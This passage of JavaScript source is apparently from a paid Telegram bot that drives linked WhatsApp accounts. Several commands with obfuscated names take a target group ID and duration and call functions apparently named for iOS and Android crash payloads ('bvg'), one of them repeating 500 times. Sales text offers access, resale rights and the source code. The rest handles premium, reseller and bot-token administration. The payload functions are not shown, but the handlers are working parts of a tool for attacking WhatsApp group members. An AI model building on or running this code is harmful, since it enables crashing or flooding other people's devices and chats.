    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /groupmix 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /groupmix: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /groupmix: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /groupmix: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });
    
      await groupMixInitiator(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /groupmix for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /groupmix: ${error.message}`);
  }
});

botInstance.onText(/\/ene29jc(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /groupui raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /groupui input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /groupui: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /groupui 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /groupui: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /groupui 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /groupui: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /groupui: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /groupui: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonUiKingGpExecutor(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /groupui for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /groupui: ${error.message}`);
  }
});

botInstance.onText(/\/ej83iejdjd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /groupios raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /groupios input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /groupios: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /groupios 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /groupios: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /groupios 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /groupios: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /groupios: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /groupios: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonIosGroupInitiator(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /groupios for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /groupios: ${error.message}`);
  }
});

botInstance.onText(/\/ejue828(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /groupfriz raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /groupfriz input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /groupfriz: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /groupfriz 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /groupfriz: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /groupfriz 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /groupfriz: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /groupfriz: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /groupfriz: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonGroupDocExecutor(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /groupfriz for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /groupfriz: ${error.message}`);
  }
});

botInstance.onText(/\/ebwowjfkd(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /autoclosegc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return userBot.sendMessage(chatId, '❌ No active WhatsApp session.');
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /autoclosegc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /autoclosegc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID and duration.\nExample: /autoclosegc 120363047626537xxx@g.us 2');
  }

  const args = match[2].trim().split(/\s+/);
  if (args.length < 2) {
    console.log(`[DEBUG] /autoclosegc: Insufficient arguments provided`);
    return userBot.sendMessage(chatId, '❌ Provide both a group JID and duration in hours.\nExample: /autoclosegc 120363047626537xxx@g.us 2');
  }

  const rawTarget = args[0];
  const durationHours = parseFloat(args[1]);

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /autoclosegc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /autoclosegc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (isNaN(durationHours) || durationHours <= 0) {
    console.log(`[DEBUG] /autoclosegc: Invalid duration "${args[1]}"`);
    return userBot.sendMessage(chatId, '❌ Invalid duration. Provide a positive number of hours (e.g., 2).');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│➻ sent bvg...
│➻ Target: ${rawTarget.replace('@g.us', '')}
│➻ From: ${userNumber}
│➻ Duration: ${durationHours} hours
└────────────────────────┘`,
parse_mode: 'HTML'
    });

      await xeonAndroidInvisibleKingGroupExecutor(durationHours, rawTarget, userNumber, chatId, botInstance);

  } catch (error) {
    console.error(`Error in /autoclosegc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /autoclosegc: ${error.message}`);
  }
});

botInstance.onText(/\/xxxbetagcxxx(?!\S)(\s+(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /xbetagc raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /xbetagc input: match[2] = "${match[2]}"`);

  if (!match[2] || match[2].trim() === '') {
    console.log(`[DEBUG] /xbetagc: No valid input provided, sending error message`);
    return userBot.sendMessage(chatId, '❌ Provide a group JID.\nExample: /xgroup 120363047626537xxx@g.us\n\nTo get group ID, use /listgc or /group-id <link>');
  }

  const rawTarget = match[2].trim();
  console.log(`[DEBUG] /xbetagc: rawTarget = "${rawTarget}"`);

  if (rawTarget.includes('chat.whatsapp.com')) {
    console.log(`[DEBUG] /xbetagc: Input is a group link, sending error message`);
    return userBot.sendMessage(chatId, '❌ Group ID must be a JID (e.g., 120363047626537xxx@g.us). Use /group-id <link> to get the group ID.');
  }

  if (!rawTarget.endsWith('@g.us')) {
    console.log(`[DEBUG] /xbetagc: Invalid group JID format for "${rawTarget}"`);
    return userBot.sendMessage(chatId, '❌ Invalid group JID. It must end with @g.us. Example: 120363047626537xxx@g.us');
  }

  try {
    await userBot.sendPhoto(chatId, CONFIG.pfp, {
      caption: `┌──────┤ NOTIFICATION ├──────┐
│ Sent bvg to group...
│ Target: ${rawTarget.replace('@g.us', '')}
│ From: ${userNumber}
└────────────────────────┘`,
    });

    for (let i = 0; i < 500; i++) {
      if (!(await validateSession(userNumber, chatId, botInstance))) {
        return;
      }
      try {
      await xbetagcios(rawTarget, userNumber, chatId, botInstance);
      await xbetagcandroid(rawTarget, userNumber, chatId, botInstance);
      await sleep(1000);
      } catch (error) {
        break; // Exit the loop on error to prevent spamming
      }
    }

  } catch (error) {
    console.error(`Error in /xbetagc for ${senderId}:`, error.message);
    await userBot.sendMessage(chatId, `❌ Failed to process /xbetagc: ${error.message}`);
  }
});

botInstance.onText(/\/channelid(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /channelid raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /channelid input: match[1] = "${match[1]}"`);

  const inviteLink = match[1] ? match[1].trim() : '';
  await getChannelIdFromInviteLink(inviteLink, userNumber, chatId, botInstance);
});

// Command handler for /groupid
botInstance.onText(/\/groupid(?:\s(.+))?/, async (msg, match) => {
  const senderId = msg.from.id;
  const chatId = msg.chat.id;

  if (msg.chat.type !== 'private') return;

  console.log(`[DEBUG] /groupid raw message: "${msg.text}"`);

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);

  if (!checkRateLimit(senderId, chatId)) return;

  const userNumber = db.userNumbers[senderId];
  if (!userNumber) {
    return userBot.sendMessage(chatId, '❌ No WhatsApp number linked to your account. Please connect using /reqpair.');
  }

  if (!(await validateSession(userNumber, chatId, botInstance))) {
    return;
  }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  console.log(`[DEBUG] /groupid input: match[1] = "${match[1]}"`);

  const inviteLink = match[1] ? match[1].trim() : '';
  await getGroupIdFromInviteLink(inviteLink, userNumber, chatId, botInstance);
});

  botInstance.onText(/\/deltoken(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  
  if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only Developer can use this command.');
    }

  const userBot = getUserBot(botInstance);

  if (!match[1]) {
    return userBot.sendMessage(chatId, '❌ Provide a bot token.\nExample: /deltoken 1234567890:AAH...');
  }
  
  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  const botToken = match[1].trim();
  const userIdWithToken = Object.keys(db.botTokens).find(
    (userId) => db.botTokens[userId] === botToken
  );

  if (!userIdWithToken) {
    return userBot.sendMessage(chatId, '❌ Token not found.');
  }

  delete db.botTokens[userIdWithToken];
  saveJson('./database/bot_tokens.json', db.botTokens);

  const botKey = Array.from(botInstances.keys()).find((key) => {
    const bot = botInstances.get(key);
    return bot.token === botToken;
  });

  if (botKey) {
    botInstances.get(botKey).stopPolling();
    botInstances.delete(botKey);
    console.log(`Stopped and removed bot: ${botKey}`);
  }

  await userBot.sendMessage(chatId, `✅ Bot token removed successfully.`);
});

  botInstance.onText(/\/addtoken(?:\s(.+))?/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);
  
  if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only Developer can use this command.');
    }

  // Premium check (updated for VIP)
// NEW - Clean & Reliable
if (!(await hasVipAccess(senderId, userBot))) {
  return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
}

  if (!match[1]) {
    return userBot.sendMessage(chatId, '❌ Provide a valid Telegram bot token.\nExample: /addtoken 1234567890:AAH1a2b3c4d5e6g7h8i9j0k');
  }

  const botToken = match[1].trim();

  if (!/^\d{9,10}:[A-Za-z0-9_-]{35}$/.test(botToken)) {
    return userBot.sendMessage(chatId, '❌ Invalid bot token format. It should be like: 1234567890:AAH1a2b3c4d5f6g7i8j0k1l2m5n6p');
  }

  if (Object.values(db.botTokens).includes(botToken)) {
    return userBot.sendMessage(chatId, '❌ This bot token is already added.');
  }

  try {
    const newBot = new TelegramBot(botToken, { polling: true });
    const botInfo = await newBot.getMe();

    if (!botInfo || !botInfo.id) {
      return userBot.sendMessage(chatId, '❌ Invalid bot token. Could not authenticate with Telegram.');
    }

    const botKey = `@${botInfo.username}`;
    botInstances.set(botKey, newBot);
    db.botTokens[senderId] = botToken; // Associate token with senderId
    saveJson('./database/bot_tokens.json', db.botTokens);
    console.log(`Bot token added for @${botInfo.username} by user ${senderId}`);
    registerCommandHandlers(newBot, false);
    await userBot.sendMessage(chatId, `✅ Bot token added successfully. Bot @${botInfo.username} is now active and can be used by all users.`);
  } catch (error) {
    console.error(`Error in /addtoken for ${senderId}: ${error.message}`);
    await userBot.sendMessage(chatId, `❌ Failed to add bot token: ${error.message}`);
  }
});

botInstance.onText(/\/addresell(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only Developer can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /addresell 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }
    
    if (db.bannedUsers.includes(userId)) {
    return userBot.sendMessage(chatId, `Cannot add user ${userId} as reseller — this user is permanently banned from the bot. Please contact owner ${CONFIG.usertele}`);
  }

    if (!db.OwnerUsers.includes(userId)) {
      db.OwnerUsers.push(userId);
      saveJson('./database/Owner.json', db.OwnerUsers);
      console.log(`${senderId} added ${userId} to resellers`);
      await userBot.sendMessage(chatId, `✅ User ${userId} added as reseller.`);
    } else {
      await userBot.sendMessage(chatId, `❌ User ${userId} is already a reseller.`);
    }
  });

  botInstance.onText(/\/addprem(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only owners and resellers can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /addprem 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }

    if (db.bannedUsers.includes(userId)) {
      return userBot.sendMessage(chatId, `Cannot add user ${userId} to premium — banned.`);
    }

    if (!db.premiumUsers[userId]) {
      db.premiumUsers[userId] = {
        addedBy: senderId,
        timestamp: Date.now()
      };
      saveJson('./database/premium.json', db.premiumUsers);
      console.log(`${senderId} added ${userId} to premium`);
      await userBot.sendMessage(chatId, `✅ User ${userId} added to premium.`);
    } else {
      await userBot.sendMessage(chatId, `❌ User ${userId} is already premium.`);
    }
  });

  botInstance.onText(/\/delprem(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only owners and resellers can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /delprem 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }

    if (db.premiumUsers[userId]) {
      delete db.premiumUsers[userId];
      saveJson('./database/premium.json', db.premiumUsers);
      console.log(`${senderId} removed ${userId} from premium`);
      await userBot.sendMessage(chatId, `✅ User ${userId} removed from premium.`);
    } else {
      await userBot.sendMessage(chatId, `❌ User ${userId} is not premium.`);
    }
  });

botInstance.onText(/\/listprem(?:\s(.+))?$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  const userBot = getUserBot(botInstance);
  if (!CONFIG.owner.includes(senderId) && !db.OwnerUsers.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only owners and resellers can use this command.');
  }

  const parts = [];
  let text = `<b>┌──────┤ Premium Users List ├──────┐</b>\n\n`;

  // Group by reseller
  const grouped = {};
  for (const [userId, info] of Object.entries(db.premiumUsers)) {
    const addedBy = info.addedBy || 0;
    if (!grouped[addedBy]) grouped[addedBy] = [];
    grouped[addedBy].push(userId);
  }

  if (Object.keys(grouped).length === 0) {
    return userBot.sendMessage(chatId, 'No premium users found.');
  }

  for (const [adderId, users] of Object.entries(grouped)) {
    const adderLink = await formatUserLink(userBot, parseInt(adderId));
    text += `<b>👤 Added by: ${adderLink}</b>\n\n`;
    
    let count = 1;
    for (const uid of users) {
      const uLink = await formatUserLink(userBot, parseInt(uid));
      text += `${count++}. ${uLink}\n   <code>${uid}</code>\n`;
    }
    text += `\n`;
  }

  text += '<b>└────────────────────────┘</b>';
  await userBot.sendMessage(chatId, text, { parse_mode: 'HTML', disable_web_page_preview: true });
});

  botInstance.onText(/\/delresell(?:\s(.+))?/, async (msg, match) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (msg.chat.type !== 'private') return;

    const membership = await checkMembership(chatId, senderId, isRootBot);
    if (!membership.isMember) return;

    const userBot = getUserBot(botInstance);

    if (!CONFIG.owner.includes(senderId)) {
      return userBot.sendMessage(chatId, '❌ Only developer can use this command.');
    }

    if (!match[1]) {
      return userBot.sendMessage(chatId, '❌ Provide a user ID.\nExample: /delresell 123456789');
    }

    const userId = parseInt(match[1].replace(/[^0-9]/g, ''), 10);
    if (isNaN(userId)) {
      return userBot.sendMessage(chatId, '❌ Invalid user ID.');
    }

    if (db.OwnerUsers.includes(userId)) {
      db.OwnerUsers = db.OwnerUsers.filter((id) => id !== userId);
      saveJson('./database/Owner.json', db.OwnerUsers);
      console.log(`${senderId} removed ${userId} from resellers`);
      await userBot.sendMessage(chatId, `✅ User ${userId} removed from resellers.`);
    } else {
      await userBot.sendMessage(chatId, `❌ User ${userId} is not a reseller.`);
    }
  });

botInstance.onText(/\/listresell(?:\\s(.+))?$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (msg.chat.type !== 'private') return;
  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;
  const userBot = getUserBot(botInstance);
  if (!CONFIG.owner.includes(senderId)) return userBot.sendMessage(chatId, 'Only Developer can use this command.');
  if (db.OwnerUsers.length === 0) return userBot.sendMessage(chatId, 'No resellers found.');

  const parts = [];
  let text = `<b>┌──────┤ Resellers List ├──────┐</b>\n\nTotal: <b>${db.OwnerUsers.length}</b>\n\n`;
  let count = 0;

  for (const userId of db.OwnerUsers) {
    count++;
    const userLink = await formatUserLink(userBot, userId);

    const line = `${count}. ${userLink}\n   <b>ID:</b> <code>${userId}</code>\n\n`;

    if (text.length + line.length > 3900) {
      text += '<b>└────────────────────────┘</b>';
      parts.push(text);
      text = `<b>┌──────┤ Resellers List (Part ${parts.length + 2}) ├──────┐</b>\n\n`;
    }
    text += line;
  }
  text += '<b>└────────────────────────┘</b>';
  parts.push(text);

  for (const p of parts) {
    await userBot.sendMessage(chatId, p, { parse_mode: 'HTML', disable_web_page_preview: true });
    await sleep(300);
  }
});

botInstance.onText(/\/listuser(?:\\s(.+))?$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  if (msg.chat.type !== 'private') return;
